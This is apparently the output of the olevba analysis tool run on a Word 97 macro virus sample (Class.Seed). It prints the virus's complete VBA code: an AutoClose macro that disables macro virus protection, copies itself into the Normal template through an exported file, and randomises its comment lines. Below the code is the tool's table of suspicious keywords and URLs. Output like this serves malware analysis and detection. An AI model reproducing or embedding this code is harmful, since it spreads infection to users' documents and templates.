olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Class.x-ae65342c5f0bac9900c09ad5043f95e5a2aa42f0
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Class.x-ae65342c5f0bac9900c09ad5043f95e5a2aa42f0 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoClose()
'41428531620166386498,35463779958778E+174142853162016638649414285316
Randomize
'43125582889344781764891,48689145803794E+21431255828893447817648943125582889
s = 0: r = 0
'35533758016134759593964,78851480210906E+20355337580161347595939635533758016
On Error GoTo 87
'5252045841329647598441,73132429838244E+205252045841329647598445252045841
Options.VirusProtection = False
'2113976484781644172411,65237739933038E+202113976484781644172412113976484
Options.SaveNormalPrompt = False
'88824970097745645616,8800673963599E+1888824970097745645618882497009
Options.ConfirmConversions = False
'22866581089772901161211,76736070765907E+21228665810897729011612122866581089
fx = ActiveDocument.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'430894564254680105691,09740273100766E+1943089456425468010569430894564
xf = NormalTemplate.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'9122160100415364780253,78902402534182E+209122160100415364780259122160100
If xf > 90 And fx > 0 Then GoTo 87
'5607164161249513616001,39906380531672E+205607164161249513616005607164161
If xf < 90 Then
'5526584281331400179361,83151102197156E+205526584281331400179365526584281
    Set xs = NormalTemplate.VBProject.VBComponents.Item(1)
'42263958724338217846491,42944251037735E+21422639587243382178464942263958724
    ActiveDocument.VBProject.VBComponents.Item(1).Name = xs.Name
'3828515625155770368645,9636929025025E+193828515625155770368643828515625
    ActiveDocument.VBProject.VBComponents.Item(1).Export Application.StartupPath & Chr(83) + Chr(69) + Chr(69) + Chr(68)
'42372575716386299370251,63684993149612E+21423725757163862993702542372575716
End If
'3179042689165652344365,26615874253368E+193179042689165652344363179042689
If fx = 0 Then Set xs = ActiveDocument.VBProject.VBComponents.Item(1)
'7326846409101123136007,40913685868419E+197326846409101123136007326846409
k = Int(Rnd(1) * 100) + 1
'2981492890074437207292,21934004286591E+2029814928900744372072929814928900
If k = 99 Then ActiveWindow.WindowState = wdWindowStateMinimize: ActiveDocument.FollowHyperlink Address:="http://www.cannabisculture.com", NewWindow:=False, AddHistory:=False, ExtraInfo:=Chr(67) + Chr(76) + Chr(65) + Chr(83) + Chr(83) + Chr(47) + Chr(83) + Chr(69) + Chr(69) + Chr(68)
'7679016900629633556254,83496671925085E+207679016900629633556257679016900
l = Int(Rnd(1) * 75) + 1
'30116478681512809612091,54440197499204E+21301164786815128096120930116478681
If l = 74 Then ActiveWindow.WindowState = wdWindowStateMinimize: ActiveDocument.FollowHyperlink Address:="http://www.Microsoft.com", NewWindow:=False, AddHistory:=False, ExtraInfo:=Chr(67) + Chr(76) + Chr(65) + Chr(83) + Chr(83) + Chr(47) + Chr(83) + Chr(69) + Chr(69) + Chr(68)
'203304822257869147041,59983554022631E+192033048222578691470420330482225
m = Int(Rnd(1) * 50) + 1
'52138508491277126016,65874453151848E+1752138508491277126015213850849
If m = 49 Then MsgBox Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(80) + Chr(82) + Chr(79) + Chr(32) + Chr(86) + Chr(105) + Chr(82) + Chr(117) + Chr(83)
'36428303044402560083211,46645807045917E+21364283030444025600832136428303044
n = Int(Rnd(1) * 25) + 1
'30177596089618730800491,86718081850109E+21301775960896187308004930177596089
If n = 24 Then MsgBox Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(67) + Chr(76) + Chr(65) + Chr(83) + Chr(83) + Chr(32) + Chr(83) + Chr(69) + Chr(69) + Chr(68)
'21773658481459767940841,00108301243628E+21217736584814597679408421773658481
xs.codemodule.AddFromFile Application.StartupPath & Chr(83) + Chr(69) + Chr(69) + Chr(68)
'21741207601172055689003,74069845348209E+20217412076011720556890021741207601
With xs.codemodule
'14982739216159335079842,38727594920326E+20149827392161593350798414982739216
    For poly = 1 To 4
'3628301136139478602241,43240257359032E+2036283011361394786022436283011361
    .deletelines 1
'619431961613478443698,34897881421184E+18619431961613478443696194319616
    Next poly
'40834709776732822798492,99246062935753E+21408347097767328227984940834709776
End With
'24109083441276543596166,66721263489565E+20241090834412765435961624109083441
If xf < 90 Then
'84715923634310306252,9066292829676E+188471592363431030625847159236
    With xs.codemodule
'375972100210134016007,90045272769536E+1837597210021013401600375972100
    .replaceline 1, "Sub AutoClose()"
'29052861601767672307612,23030773079136E+21290528616017676723076129052861601
    .replaceline 93, "Sub ToolsMacro()"
'1138296948178707060898,95920072050079E+1911382969481787070608911382969481
    End With
'7143968484218729310251,56259529895306E+207143968484218729310257143968484
End If
'315518124110458756003,29992707353962E+18315518124110458756003155181241
With xs.codemodule
'243828225264644570416,45278158589578E+1824382822526464457041243828225
    For poly = 2 To 92 Step 2
'2710451844280794017,61078642188654E+162710451844280794012710451844
    r = Int(Rnd(412835) * 203989) + 8485
'236728996374739907248,87118020020583E+1823672899637473990724236728996
    s = Int(Rnd(384958) * 285865) + 2988
'31257532804320968723361,00326903994832E+21312575328043209687233631257532804
    .replaceline poly, "'" & r * r & s * s & r * r * s * s & r * r & s * s & r * r
'1245454681615823929647,66980795841953E+191245454681615823929641245454681
Next poly
'360088576523691186491,88575213606935E+1936008857652369118649360088576
End With
'4901680144231730595291,13586925769029E+204901680144231730595294901680144
87:
'28296622656379147100891,07285824450007E+21282966226563791471008928296622656
If xf > 90 And fx = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
'21874410000261785928045,72641272217746E+20218744100002617859280421874410000
End Sub
'7958067264743260263845,91491517429711E+207958067264743260263847958067264
Sub ToolsMacro()
'Word97/Class.Seed by Virus :)
End Sub


















+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |http://www.cannabisc|URL                                          |
|          |ulture.com          |                                             |
|IOC       |http://www.Microsoft|URL                                          |
|          |.com                |                                             |
|Hex String|B&9XrC8!xFI         |4226395872433821784649                       |
|Hex String|!B&9XrC8!xFIB&9Xr   |2142263958724338217846494226395872           |
|Hex String|&aXt%3h             |26615874253368                               |
|Hex String|$8("RddEpA          |24382822526464457041                         |
+----------+--------------------+---------------------------------------------+
